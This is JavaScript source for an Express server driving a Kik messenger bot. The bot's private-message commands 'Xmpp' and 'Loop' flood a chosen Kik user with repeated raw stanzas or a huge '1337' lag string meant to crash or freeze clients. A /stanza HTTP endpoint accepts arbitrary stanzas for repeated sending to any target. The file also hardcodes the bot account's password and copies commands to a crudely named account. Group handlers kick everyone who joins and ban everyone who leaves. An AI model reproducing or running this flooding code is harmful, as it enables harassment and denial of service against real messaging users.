/////////////
////server//
///////////

const express = require("express");
const app = express();

// we've started you off with Express,
// but feel free to use whatever libs or frameworks you'd like through `package.json`.
app.use(express.json({ limit: "500mb", extended: true }));
app.use(express.urlencoded({ limit: "500mb", extended: true }));

// http://expressjs.com/en/starter/static-files.html
app.use(express.static("public"));

app.get("/", function(request, response) {
  response.sendFile(__dirname + "/views/index.html");
});

////////////
///bot code
///////////
const KikClient = require("./src/core"),
  decode = require("unescape");

const Kik = new KikClient({
  username: "Plaguezbot1",
  password: "Ezybot15",
  promptCaptchas: true,
  trackUserInfo: true,
  trackFriendInfo: true
});

async function webXmpp(stan, num, vic) {
  let numb = 0;
  while (numb <= num) {
    console.log(stan)
    Kik.sendXmpp(vic, stan);
    await new Promise(resolve => setTimeout(resolve, delay));
    numb += 1;
  }
}

app.post("/stanza", function(req, res) {
  console.log(req.body);
  res.send("");
  webXmpp(req.body[0], req.body[1], req.body[2]);
});

Kik.on("authenticated", () => {
  //this is not needed since the client grabs roster automatically once authenticated
  /*    Kik.getRoster((groups, friends) => {
        console.log("We got the roster")
        console.log(groups)
        console.log(friends)
    })*/
});
//alternatively you can use this event for roster
Kik.on("receivedroster", (groups, friends) => {
  console.log(groups);
  console.log(friends);
});
//alternatively you can use this event for captcha
Kik.on("receivedcaptcha", captchaUrl => {
  console.log("Please solve captcha" + captchaUrl);
});
Kik.on("receivedjidinfo", users => {
  console.log("We got peer info:");
  console.log(users);
});

/*GROUP EVENTS*/
Kik.on("receivedgroupmsg", (group, sender, msg) => {
  console.log(`GROUP:${group.code}: [${sender.displayName}]: ${msg}`);
});
Kik.on("grouptyping", (group, sender, isTyping) => {
  if (isTyping) {
    console.log(`GROUP:${group.code}: ${sender.displayName} is typing...`);
  } else {
    console.log(`GROUP:${group.code}: ${sender.displayName} stopped typing`);
  }
});
Kik.on("userleftgroup", (group, user, kickedBy) => {
  console.log(`GROUP:${group.code}: ${user.displayName} left the group`);
  //ban anyone once they leave
  Kik.setBanned(group.jid, user.jid, true);
});
Kik.on("userjoinedgroup", (group, user, invitedBy) => {
  console.log(`GROUP:${group.code}: ${user.displayName} joined the group`);
  //kicking anyone once they join
  Kik.setGroupMember(group.jid, user.jid, false);
});

let lag1 =
  "133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713++l";
let delay = 150;

/*PRIVATE EVENTS*/
Kik.on("receivedprivatemsg", async (sender, msg) => {
  let msgParts = msg.split(" ");
  let msgNL = msg.split("\n");

  if (msgParts[0] == "Xmpp" && msgParts[1].endsWith(".kik.com")) {
    (async () => {
            // Kik.sendXmpp("oooweeoo_tis@talk.kik.com", msg);
      // Kik.sendXmpp('unclefunkle01_ap0@talk.kik.com', msg);
      Kik.sendXmpp("fuckdavid___ym7@talk.kik.com", msg);
      let numb = 0;
      while (numb <= parseInt(msgParts[2])) {
       await Kik.sendXmpp(msgParts[1], decode(msgNL[1]));
        await new Promise(resolve => setTimeout(resolve, delay));
        numb += 1;
      }
      // await Kik.forceAdmin(sender.jid);
    })();
    return;
  }

  if (msgParts[0] == "Add" && msgParts[1] == "me") {
    let mess = "Your wish is my command";
    await Kik.addFriend(sender.jid);
    await Kik.addFriend(sender.jid);
    await Kik.addFriend(sender.jid);
    await Kik.sendMessage(sender.jid, mess);
    return;
  }
  
    if (msgParts[0] == "Send" && msgParts[1] == "link") {
    let mess = " https://real-dramatic-alvarezsaurus.glitch.me/ ";
    await Kik.sendMessage(sender.jid, mess);
    return;
  }

  if (msgParts[0] == "Loop" && msgParts[1].endsWith(".kik.com")) {
    (async () => {
      // Kik.sendMessage("oooweeoo_tis@talk.kik.com", msg);
      // Kik.sendMessage('unclefunkle01_ap0@talk.kik.com', msg);
      Kik.sendMessage("fuckdavid___ym7@talk.kik.com", msg);
      let numb = 0;
      while (numb <= msgParts[2]) {
        await Kik.sendMessage(msgParts[1], lag1);
        await new Promise(resolve => setTimeout(resolve, delay));
        numb += 1;
      }
      // await Kik.forceAdmin(sender.jid);
    })();
    return;
  }
});
Kik.on("privatetyping", (sender, isTyping) => {
  if (isTyping) {
    console.log(`PRIVATE: ${sender.jid} is typing`);
  } else {
    console.log(`PRIVATE: ${sender.jid} stopped typing`);
  }
});

// listen for requests :)
const listener = app.listen(process.env.PORT, function() {
  Kik.connect();
  console.log("Your app is listening on port " + listener.address().port);
});